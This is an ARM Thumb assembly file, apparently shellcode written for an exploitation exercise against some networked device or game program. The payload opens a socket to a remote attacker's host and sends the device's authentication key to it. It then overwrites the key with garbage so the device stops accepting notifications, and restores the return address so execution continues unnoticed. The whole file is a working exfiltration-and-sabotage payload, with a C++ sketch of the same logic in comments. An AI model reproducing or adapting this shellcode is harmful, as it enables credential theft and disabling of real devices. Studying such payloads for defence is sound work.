.section .text
.thumb
.global start

@ c++ code of shell
@ int socket = api->socket(true);
@ NetAddr addr;
@ addr.ip = <some ip address>
@ addr.port = <some port>
@ api->connect(socket, &addr);
@ api->send(socket, authKey);
@ api->close(socket)

start:
	@ sp + 104 is beginning of stack frame of previous function - Context::Update()
	ldr		r4, [sp, #88]	@ at sp + 88 r5 register is stored, which contain address of Context
	addw		r4, r4, #548	@ NotificationCtx is a member of Context, 548 - offset of it
	mov		r6, sp
	sub		r6, #12		@ sp - 12 stores IP address and port of remote attacker's host, it is a part of our notification
	sub		sp, #300
	ldr		r0, [r4, #0]	@ load api
	ldr		r3, [r0, #0]	@ load api vtable
	ldr		r5, [r3, #44]	@ load socket() function
	movs		r1, #1
	blx		r5		@ call socket(true)
	mov		r7, r0

	ldr		r0, [r4, #0]    @ load api
	ldr		r3, [r0, #0]	@ load api vtable
	ldr		r5, [r3, #60]   @ load connect()
	mov		r1, r7		@ socket
	mov		r2, r6		@ IP address and port
	blx		r5

	ldr		r0, [r4, #0]    @ load api
	ldr		r3, [r0, #0]	@ load api vtable
	ldr		r5, [r3, #52]   @ load send()
	mov		r1, r7		@ socket
	ldr		r6, [r4, #28]   @ load auth key
	str		r6, [sp, #0]	@ store auth key on stack
	mov		r2, sp
	mov		r3, #4
	@ 4th argument is ignored in case of tcp socket
	blx		r5

	ldr		r0, [r4, #0]    @ load api
	ldr		r3, [r0, #0]	@ load api vtable
	ldr		r5, [r3, #80]   @ load close()
	mov		r1, r7          @ socket
	blx		r5

	str		r5, [r4, #28]	@ overwrite auth key by some garbage, so device will never take new notications

	add		sp, #300
	subw		r4, r4, #548 	@ restore previous this - address of Context

	ldr		r5, [sp, #92]	@ at sp + 92 r6 register is stored, which contain address of GameUpdate+1
	ldr		r6, =0xD5E	@ GameUpdate - (Context::Update() + offset), 0x1eec - (0x1178 + 0x16)
	sub		r5, r6		@ restored return address
	mov		pc, r5
